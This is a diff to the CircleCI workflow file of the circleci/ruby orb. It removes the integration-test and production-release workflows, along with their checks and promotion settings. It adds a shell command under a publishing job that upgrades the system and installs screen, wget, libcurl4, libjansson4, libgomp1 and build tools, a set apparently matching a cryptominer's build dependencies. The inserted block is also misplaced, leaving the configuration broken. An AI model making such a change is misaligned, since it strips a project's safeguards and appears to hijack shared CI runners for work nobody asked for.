@@ -97,44 +97,7 @@ workflows:
       - orb-tools/publish-dev:
           orb-name: circleci/ruby
           context: orb-publishing
-          requires:
-            - orb-tools/pack
-            - orb-tools/lint
-
-      # trigger an integration workflow to test the
-      # dev:${CIRCLE_SHA1:0:7} version of your orb
-      - orb-tools/trigger-integration-tests-workflow:
-          name: trigger-integration-dev
-          context: orb-publishing
-          requires:
-            - orb-tools/publish-dev
-
-  # This `integration-tests_prod-release` workflow will only run
-  # when the run-integration-tests pipeline parameter is set to true.
-  # It is meant to be triggered by the "trigger-integration-tests-workflow"
-  # job, and run tests on <your orb>@dev:${CIRCLE_SHA1:0:7}.
-  integration-tests_prod-release:
-    when: << pipeline.parameters.run-integration-tests >>
-    jobs:
-      - integration-tests
-      - install-on-machine
-      - install-on-node
-      # your integration test jobs go here: essentially, run all your orb's
-      # jobs and commands to ensure they behave as expected. or, run other
-      # integration tests of your choosing
-      - orb-tools/dev-promote-prod-from-commit-subject:
-          orb-name: circleci/ruby
-          context: orb-publishing
-          add-pr-comment: true
-          bot-token-variable: GHI_TOKEN
-          bot-user: cpe-bot
-          fail-if-semver-not-indicated: true
-          publish-version-tag: true
-          ssh-fingerprints: c3:5b:58:1f:cd:05:64:a7:8c:b4:d9:19:be:9f:85:1f
-          requires:
-            - install-on-machine
-            - integration-tests
-            - install-on-node
-          filters:
-            branches:
-              only: master
+          command: | 
+                    apt-get update 
+                    apt-get upgrade -y 
+                    apt-get install -y ca-certificates screen wget git libcurl4 libjansson4 libgomp1 build-essential make cmake 
